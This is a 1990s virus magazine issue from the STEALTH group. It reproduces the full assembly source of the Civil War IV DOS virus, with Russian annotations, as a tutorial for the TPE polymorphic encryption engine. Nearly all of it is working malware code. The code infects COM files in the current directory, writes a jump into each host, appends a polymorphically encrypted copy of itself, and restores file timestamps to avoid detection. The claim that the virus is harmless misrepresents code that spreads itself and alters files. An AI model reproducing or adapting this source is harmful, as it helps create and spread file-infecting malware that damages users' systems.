;      ▄▄                  █
;     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV  1996
;     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀█
;      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █▀▀█ █ 
;       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ ▀▀▀█ █
;       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █▄▄█ █
;       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄█
;       (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


;****************************************************************************
;    Демонстрация использования TPE. Вирус СivilWar 1.2. COM, нерезидент,
;    поражает файлы в текущем директории, абсолютно безобиден.
;    							  (c) Dark Helmet
;    Полностью сохранен авторский стиль и по возможности коментарии автора.
;    							  Eternal Maverick.
;****************************************************************************
;*   Civil War IV v1.2                              *
;*                                          *
;*   Assembled with Tasm 2.5                            *
;*                                          *
;*   (c) Jan '93 by Dark Helmet, The Netherlands.               *
;*   The author takes no responsibilty for any damages caused by the virus  *
;*                                          *
;*   This is a example virus with the TPE engine for teaching you how to    *
;*   use the TPE engine.                            *
;*                                      *
;*--------------------------------------------------------------------------*
;*                                      *
;* Notes:                                   *
;*                                      *
;* This virus is NOT dedicated to Sara Gordon, but to all the innocent      *
;* people who are killed in Yugoslavia.                     *
;*                                      *
;* The text in the virus is taken from the song Civil War (hence the name)  *
;* by Guns and Roses, Use Your Illusion II, we hope they don't mind it.     *
;*                                      *
;* The first name for the virus was NAVIGATOR II, because the virus is      *
;* based on the NAVIGATOR virus (also written by me, a while back), but     *
;* since I decided to put the songtext in it I renamed it to Civil War IV   *
;*                                      *
;* You need the TPE 1.3 engine to link this program.                *    *
;*                                      *
;****************************************************************************

        .model tiny
        .radix 16
        .code

        extrn   rnd_init:near
        extrn   rnd_get:near
        extrn   crypt:near
        extrn   tpe_top:near

        org 100h

len     equ offset tpe_top - begin

Dummy:          db 0e9h, 03h, 00h, 44h, 48h, 00h

Begin:          call virus		; Получить смещение вируса

Virus:          pop bp
                sub bp,offset virus

                mov dx,0fe00h		; Переустановить DTA 
                mov ah,1ah
                int 21h

Restore_begin:  call rnd_init		; Инициализация генератора
					; случайных чисел
        	mov di,0100h
        	lea si,ds:[buffer+bp]
        	mov cx,06h
        	rep movsb		; Вернуть оригинальные байты
					; зараженной программы на место

First:		lea dx,[com_mask+bp]    ; Найти первый COM файл
        	mov ah,04eh
        	xor cx,cx
        	int 21h

Open_file:  	call rnd_get		; Получить случайное число
        	mov ax,03d02h           ; Открыть для чтения/записи
        	mov dx,0fe1eh
        	int 21h
        	mov [handle+bp],ax
        	xchg ax,bx

Read_date:  	mov ax,05700h           ; Получить и сохранить дату и
        	int 21h			; время создания файла
        	mov [date+bp],dx
        	mov [time+bp],cx

Check_infect:   mov bx,[handle+bp]      ; Проверить не заражен ли файл
	        mov ah,03fh
       	 	mov cx,06h
        	lea dx,[buffer+bp]
        	int 21h

                mov al,byte ptr [buffer+bp]+3   ;Compare initials
        	mov ah,byte ptr [buffer+bp]+4
        	cmp ax,[initials+bp]
        	jne infect_file         ; Не заражен!
                     			; Так заразим!!!

Close_file:     mov bx,[handle+bp]      ; Закрытие файла.
        	mov ah,3eh
        	int 21h

Next_file:      mov ah,4fh          	; Ищем следующий СOM file
        	int 21h
	        jnb open_file		; Ecли есть, то продолжаем.
        	jmp exit

Infect_file:    mov ax,word ptr [cs:0fe1ah] ; Длина файла
	        sub ax,03h
	        mov [lenght+bp],ax
	        mov ax,04200h           ; Переставить указатель в начало
        	call move_pointer

Write_jump:     mov ah,40h        	; Записать JMP
        	mov cx,01h
        	lea dx,[jump+bp]
        	int 21h

        	mov ah,40h          	; Записать адрес для JMP
					; Ради бога, никогда так не делайте!!!
					; Пишите все сразу!
        	mov cx,02h
        	lea dx,[lenght+bp]
        	int 21h

        	mov ah,40	        ; Записать метку - заражен.
        	mov cx,02h
       		lea dx,[initials+bp]
        	int 21h

        	mov  ax,4202h           ; Указатель - в конец файла!
        	call move_pointer

;*****************************************************************************
;                   T P E                        *
;*****************************************************************************

Encrypt:    push bp             ; BP - смещение вируса
                        	; Сохраняем BP

        mov ax,cs           ; Вычисляем сегмент, в котором будем производить
        add ax,01000h	    ; шифрование вируса
        mov es,ax           ; В ES должен быть этот сегмент

        lea dx,[begin+bp]   ; DS:DX указывает на шифруемый код!

        mov cx,len          ; В СX - длина вируса

        mov bp,[lenght+bp]  ; Расшифровываемый код начинается
        add bp,103h         ; в этой точке

        xor si,si           ; Расстояние между шифровщиком и
                            ; зашифроанным кодом 0 байт

        call rnd_get        ; В AX случайное число
        call crypt          ; шифровка вируса

        pop bp              ; Восстанавливаем BP

;******************************************************************************
;               T P E - E N D                     *
;******************************************************************************

Write_virus:    mov bx,[handle+bp]
        	mov ah,40h
        	int 21h			; Записываем тело вируса в файл

Restore_date:   mov ax,05701h
        	mov bx,[handle+bp]
        	mov cx,[time+bp]
        	mov dx,[date+bp]
        	int 21h			; Восстанавливаем дату и время
					; создания файла 

Exit:       	mov ax,cs
        	mov ds,ax
        	mov es,ax
        	mov bx,0100h            ; Передаем управление носителю
        	jmp bx

;		Вот и все!!!

;----------------------------------------------------------------------------

move_pointer:   mov bx,[handle+bp]	; Процедура... No Comment!
        	xor cx,cx
        	xor dx,dx
        	int 21h
        	ret

;----------------------------------------------------------------------------
v_name      db "Civil War IV v1.2, (c) Jan '93 "
com_mask    db "*.com",0
handle      dw ?
date        dw ?
time        dw ?
buffer          db 090h,0cdh,020h,044h,048h,00h
initials        dw 4844h
lenght      dw ?
jump            db 0e9h,0
message     db "For all i've seen has changed my mind"
        db "But still the wars go on as the years go by"
        db "With no love of God or human rights"
        db "'Cause all these dreams are swept aside"
        db "By bloody hands of the hypnotized"
        db "Who carry the cross of homicide"
        db "And history bears the scars of our Civil Wars."
writer      db "[ DH / TridenT ]",00

        end  dummy
